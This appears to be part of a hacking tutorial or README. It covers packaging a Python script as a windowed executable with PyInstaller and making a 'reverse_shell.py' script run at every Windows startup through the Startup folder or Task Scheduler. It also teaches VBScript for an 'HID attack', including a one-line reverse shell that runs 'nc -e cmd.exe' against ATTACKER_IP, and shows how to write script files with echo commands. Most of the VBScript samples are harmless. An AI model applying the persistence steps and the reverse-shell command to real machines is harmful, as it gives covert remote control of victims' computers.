### ***Create exe via Pyinstaller***
   ```cmd
   pyinstaller --noconfirm --onefile --windowed --icon "<Your_App_Icon_Location.ico_format>"  "<your_py_file_location>"
   ```
   ###OR
   ```cmd
   python -m PyInstaller --noconfirm --onefile --windowed --icon "<Your_App_Icon_Location.ico_format>"  "<your_py_file_location>"
   ```

### **Running the Script on Startup (Windows)**

To ensure that the reverse shell starts automatically when your Windows machine starts, you can place the script in the **Windows Startup folder** or use Task Scheduler. 

#### **Option 1: Add to Windows Startup Folder**

1. Open the **Startup folder** by pressing `Win + R`, typing `shell:startup`, and pressing Enter.
2. Create a shortcut to the Python script in this folder. Right-click the folder and choose **New** → **Shortcut**. Then, browse to your script (`reverse_shell.py`) and add it to the Startup folder.

Now, every time Windows starts, it will automatically run the script.

#### **Option 2: Use Task Scheduler**

1. Open **Task Scheduler** (`Win + R`, type `taskschd.msc`, and press Enter).
2. In the right pane, click **Create Task**.
3. In the **General** tab, give your task a name like `Reverse Shell`.
4. In the **Triggers** tab, click **New** and set the task to trigger **At startup**.
5. In the **Actions** tab, click **New**, and in the **Program/script** field, enter the path to Python (e.g., `C:\Python39\python.exe`).
6. In the **Add arguments (optional)** field, enter the full path to your `reverse_shell.py` script.
7. Click **OK** to create the task.

### ***Running HID Attack***

A **VBS (VBScript)** script is a file written in **Visual Basic Scripting Edition**, a lightweight programming language developed by Microsoft. It is used primarily for automation tasks, administrative scripting, and system management. VBS scripts can be executed directly in Windows using the Windows Script Host (WSH) without requiring additional software.


### **Basic Structure of a VBS Script**
A VBS script consists of commands and logic written in VBScript syntax. Here's a simple example:

#### Example: Displaying a Message Box
```vbscript
MsgBox "Hello, this is a VBScript!", vbInformation, "VBScript Example"
```
- **What it does**: Displays a pop-up message box with the text, "Hello, this is a VBScript!"

---

### **How to Run a VBS Script**
1. Save the script with a `.vbs` extension (e.g., `example.vbs`).
2. Double-click the file to execute it. The Windows Script Host (WSH) processes the script.
3. Alternatively, run it from the command prompt:
   ```cmd
   cscript example.vbs
   ```

---

### **Practical Examples**
#### **1. Open a Website**
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "https://www.example.com"
```

#### **2. Automate File Operations**
```vbscript
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile "C:\source\file.txt", "C:\destination\file.txt"
```

#### **3. Create a Startup Script**
```vbscript
Set objShell = CreateObject("WScript.Shell")
startupFolder = objShell.SpecialFolders("Startup")
Set link = objShell.CreateShortcut(startupFolder & "\example.lnk")
link.TargetPath = "C:\path\to\your\program.exe"
link.Save
```

#### **4. Run a Reverse Shell (for Educational Purposes Only)**
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /k nc -e cmd.exe ATTACKER_IP ATTACKER_PORT"
```


You can create a `.vbs` (VBScript) file via the `echo` command using both single-line and multi-line approaches. Here's how:

---
### ***Create VBS or other file and write file via Shell***



### **Method 1: Single-Line Approach**
This is useful for small scripts that can fit in a single command.

#### Example: Create a `hello.vbs` Script
```cmd
echo MsgBox "Hello from VBScript!" > hello.vbs
```

- **Explanation**:
  - `echo` writes the text to a new file named `hello.vbs`.
  - The content of the file is `MsgBox "Hello from VBScript!"`.
  - To execute: 
    ```cmd
    cscript hello.vbs
    ```
    or just double-click `hello.vbs`.

---

### **Method 2: Multi-Line Approach**
For larger scripts, you need to use a `>>` operator to append multiple lines to the file.

#### Example: Create a More Complex VBScript
```cmd
echo Set objShell = CreateObject("WScript.Shell") > script.vbs
echo objShell.Run "notepad.exe" >> script.vbs
echo MsgBox "Notepad launched!", vbInformation, "VBScript Example" >> script.vbs
```

- **Explanation**:
  - The `>` operator creates the file and writes the first line.
  - The `>>` operator appends subsequent lines to the file.
  - This script:
    1. Creates a shell object.
    2. Launches `notepad.exe`.
    3. Displays a message box saying "Notepad launched!".

#### Execution:
To run the `script.vbs`:
```cmd
cscript script.vbs
```
or double-click `script.vbs`.
